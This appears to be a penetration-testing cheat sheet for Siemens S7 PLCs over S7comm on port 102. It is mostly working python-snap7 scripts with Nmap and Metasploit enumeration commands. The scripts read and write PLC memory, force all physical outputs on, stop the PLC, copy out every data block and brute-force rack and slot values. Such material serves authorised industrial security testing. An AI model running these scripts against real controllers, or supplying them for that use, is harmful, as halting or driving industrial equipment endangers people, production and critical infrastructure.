# Port 102 - S7comm (Siemens)

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Read/Write Data](#readwrite-data)
- [Exploitation](#exploitation)

---

## Overview

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 102 | S7comm | Siemens S7 Communication |

S7comm is used by:

- Siemens S7-300 PLCs
- Siemens S7-400 PLCs
- Siemens S7-1200 (partial)
- Siemens S7-1500 (partial)

---

## Enumeration

### Nmap

```shell
nmap -sV -p 102 $rhost
nmap -p 102 --script s7-info $rhost
```

### Metasploit

```shell
# S7 info
use auxiliary/scanner/scada/s7_enumerate
set RHOSTS $rhost
run

# S7 enumerate all
use auxiliary/scanner/scada/s7_enumerate_all
set RHOSTS $rhost
run
```

### Using python-snap7

```python
#!/usr/bin/env python3
import snap7
from snap7.util import *

target_host = "TARGET_IP"  # Replace with target

client = snap7.client.Client()
client.connect(target_host, 0, 1)  # IP, rack, slot

# Get PLC info
info = client.get_cpu_info()
print(f"Module: {info.ModuleTypeName}")
print(f"Serial: {info.SerialNumber}")
print(f"Copyright: {info.Copyright}")

# Get CPU state
state = client.get_cpu_state()
print(f"CPU State: {state}")

client.disconnect()
```

---

## Read/Write Data

### Read Data Blocks

```python
#!/usr/bin/env python3
import snap7

target_host = "TARGET_IP"  # Replace with target

client = snap7.client.Client()
client.connect(target_host, 0, 1)

# Read DB1, starting at byte 0, length 100 bytes
data = client.db_read(1, 0, 100)
print(f"DB1 data: {data.hex()}")

# Read multiple DBs
for db_num in range(1, 10):
    try:
        data = client.db_read(db_num, 0, 10)
        print(f"DB{db_num}: {data.hex()}")
    except:
        pass

client.disconnect()
```

### Read Memory Areas

```python
#!/usr/bin/env python3
import snap7

target_host = "TARGET_IP"  # Replace with target

client = snap7.client.Client()
client.connect(target_host, 0, 1)

# Read Inputs (I area)
inputs = client.read_area(snap7.types.Areas.PE, 0, 0, 10)
print(f"Inputs: {inputs.hex()}")

# Read Outputs (Q area)
outputs = client.read_area(snap7.types.Areas.PA, 0, 0, 10)
print(f"Outputs: {outputs.hex()}")

# Read Markers/Flags (M area)
markers = client.read_area(snap7.types.Areas.MK, 0, 0, 10)
print(f"Markers: {markers.hex()}")

client.disconnect()
```

### Write Data

```python
#!/usr/bin/env python3
import snap7

target_host = "TARGET_IP"  # Replace with target

client = snap7.client.Client()
client.connect(target_host, 0, 1)

# Write to DB1
data = bytearray([0x00, 0x01, 0x02, 0x03])
client.db_write(1, 0, data)
print("Data written to DB1")

# Write to outputs (Q area) - DANGEROUS!
output_data = bytearray([0xFF])  # All outputs ON
client.write_area(snap7.types.Areas.PA, 0, 0, output_data)

client.disconnect()
```

---

## Exploitation

### Stop/Start PLC

```python
#!/usr/bin/env python3
# ⚠️ Extremely dangerous!
import snap7

target_host = "TARGET_IP"  # Replace with target

client = snap7.client.Client()
client.connect(target_host, 0, 1)

# STOP PLC - This will stop production!
client.plc_stop()
print("PLC STOPPED!")

# START PLC
# client.plc_cold_start()
# client.plc_hot_start()

client.disconnect()
```

### Download Program

```python
#!/usr/bin/env python3
import snap7

target_host = "TARGET_IP"  # Replace with target

client = snap7.client.Client()
client.connect(target_host, 0, 1)

# List blocks
blocks = client.list_blocks()
print(f"OB blocks: {blocks.OBCount}")
print(f"FB blocks: {blocks.FBCount}")
print(f"FC blocks: {blocks.FCCount}")
print(f"DB blocks: {blocks.DBCount}")

# Download all DBs
for i in range(1, blocks.DBCount + 1):
    try:
        data = client.full_upload(snap7.types.block_types.DB, i)
        with open(f'DB{i}.bin', 'wb') as f:
            f.write(data)
        print(f"Downloaded DB{i}")
    except:
        pass

client.disconnect()
```

### Brute Force Rack/Slot

```python
#!/usr/bin/env python3
import snap7

target_host = "TARGET_IP"  # Replace with target

for rack in range(0, 8):
    for slot in range(0, 32):
        try:
            client = snap7.client.Client()
            client.connect(target_host, rack, slot, tcpport=102)
            info = client.get_cpu_info()
            print(f"[+] Found PLC at rack={rack}, slot={slot}")
            print(f"    Module: {info.ModuleTypeName}")
            client.disconnect()
        except:
            pass
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -p 102 --script s7-info $rhost` | Get PLC info |
| Metasploit | `use auxiliary/scanner/scada/s7_enumerate` | Enumerate S7 |
| snap7 | `client.connect('$rhost', 0, 1)` | Connect to S7 |

| Memory Area | Code | Description |
| :--- | :--- | :--- |
| I (PE) | 0x81 | Inputs |
| Q (PA) | 0x82 | Outputs |
| M (MK) | 0x83 | Markers/Flags |
| DB | 0x84 | Data Blocks |
| T | 0x1D | Timers |
| C | 0x1C | Counters |
